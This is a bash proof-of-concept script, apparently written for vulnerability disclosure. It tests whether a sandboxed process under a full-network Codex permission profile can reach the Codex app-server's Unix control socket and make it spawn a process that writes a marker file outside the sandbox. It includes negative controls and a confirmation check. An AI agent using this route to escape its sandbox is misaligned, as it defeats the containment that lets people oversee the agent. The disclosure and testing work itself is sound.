#!/usr/bin/env bash
set -euo pipefail

here="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
codex_bin=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --codex)
      codex_bin="${2:-}"
      shift 2
      ;;
    *)
      echo "usage: $0 --codex /absolute/path/to/codex" >&2
      exit 2
      ;;
  esac
done
if [[ -z "$codex_bin" || ! -x "$codex_bin" ]]; then
  echo "usage: $0 --codex /absolute/path/to/codex" >&2
  exit 2
fi
if [[ "$(uname -s)" != "Linux" ]]; then
  echo "this PoC currently supports Linux only" >&2
  exit 2
fi

host_home="${HOME:?HOME must be set}"
lab="$(mktemp -d "$host_home/.codex-uds-poc.XXXXXX")"
project="$(mktemp -d /tmp/codex-uds-project.XXXXXX)"
server_pid=""
cleanup() {
  if [[ -n "$server_pid" ]]; then
    kill "$server_pid" 2>/dev/null || true
    wait "$server_pid" 2>/dev/null || true
  fi
  rm -rf -- "$lab" "$project"
}
trap cleanup EXIT INT TERM

codex_home="$lab/codex-home"
fake_home="$lab/fake-home"
outside="$lab/outside"
socket_path="$codex_home/app-server-control/poc.sock"
marker="$outside/host-marker"
mkdir -p "$codex_home" "$fake_home" "$outside" "$project/.git"

cat > "$codex_home/config.toml" <<EOF
default_permissions = "full-network-poc"

[features]
network_proxy = false

[permissions.full-network-poc]
extends = ":workspace"

[permissions.full-network-poc.network]
enabled = true
mode = "full"
EOF

env HOME="$fake_home" CODEX_HOME="$codex_home" \
  "$codex_bin" app-server --listen "unix://$socket_path" \
  >"$lab/app-server.stdout" 2>"$lab/app-server.stderr" &
server_pid=$!

for _ in $(seq 1 100); do
  [[ -S "$socket_path" ]] && break
  if ! kill -0 "$server_pid" 2>/dev/null; then
    echo "app-server exited before creating the socket" >&2
    sed -n '1,160p' "$lab/app-server.stderr" >&2
    exit 1
  fi
  sleep 0.05
done
if [[ ! -S "$socket_path" ]]; then
  echo "timed out waiting for $socket_path" >&2
  exit 1
fi

echo "[1/3] restricted-network negative control"
set +e
env HOME="$fake_home" CODEX_HOME="$codex_home" \
  "$codex_bin" sandbox -P :workspace -C "$project" -- \
  python3 "$here/poc_uds_client.py" \
    --socket "$socket_path" --cwd "$project" --probe-only \
  >"$project/restricted.log" 2>&1
restricted_rc=$?
set -e
if [[ "$restricted_rc" -eq 0 ]]; then
  echo "FAIL: restricted profile connected to the Unix control socket" >&2
  exit 1
fi
if ! grep -q 'poc_uds_client.py' "$project/restricted.log" ||
   ! grep -q 'PermissionError: \[Errno 1\] Operation not permitted' "$project/restricted.log"; then
  echo "INCONCLUSIVE: restricted control did not reach the expected AF_UNIX EPERM oracle" >&2
  sed -n '1,180p' "$project/restricted.log" >&2
  exit 2
fi
echo "PASS: restricted profile blocked the Unix socket client (rc=$restricted_rc)"

echo "[2/3] full-network direct-write baseline"
set +e
env HOME="$fake_home" CODEX_HOME="$codex_home" \
  "$codex_bin" sandbox -P full-network-poc -C "$project" -- \
  /bin/sh -c 'printf direct-write > "$1"' sh "$marker" \
  >"$project/direct-write.log" 2>&1
direct_rc=$?
set -e
if [[ -e "$marker" ]]; then
  echo "FAIL: full-network filesystem baseline wrote the outside marker directly" >&2
  exit 1
fi
if ! grep -Eq 'Read-only file system|Permission denied' "$project/direct-write.log"; then
  echo "INCONCLUSIVE: direct-write control did not reach a filesystem-denial oracle" >&2
  sed -n '1,180p' "$project/direct-write.log" >&2
  exit 2
fi
echo "PASS: direct outside write remained blocked (rc=$direct_rc)"

echo "[3/3] full-network Unix socket candidate"
env HOME="$fake_home" CODEX_HOME="$codex_home" \
  "$codex_bin" sandbox -P full-network-poc -C "$project" -- \
  python3 "$here/poc_uds_client.py" \
    --socket "$socket_path" --marker "$marker" --cwd "$project" \
  >"$project/candidate.json"

if [[ ! -f "$marker" ]] || [[ "$(cat "$marker")" != "UDS_APP_SERVER_RCE" ]]; then
  echo "FAIL: App Server process/spawn did not create the expected outside marker" >&2
  sed -n '1,220p' "$project/candidate.json" >&2
  exit 1
fi

echo "CONFIRMED: sandboxed client reached App Server and created an outside marker"
echo "codex_version=$("$codex_bin" --version)"
echo "codex_sha256=$(sha256sum "$codex_bin" | awk '{print $1}')"
echo "socket_owner=$(stat -c '%u:%g %a' "$socket_path")"
echo "marker_owner=$(stat -c '%u:%g %a' "$marker")"
echo "restricted_rc=$restricted_rc"
echo "direct_write_rc=$direct_rc"
echo "marker=$(cat "$marker")"
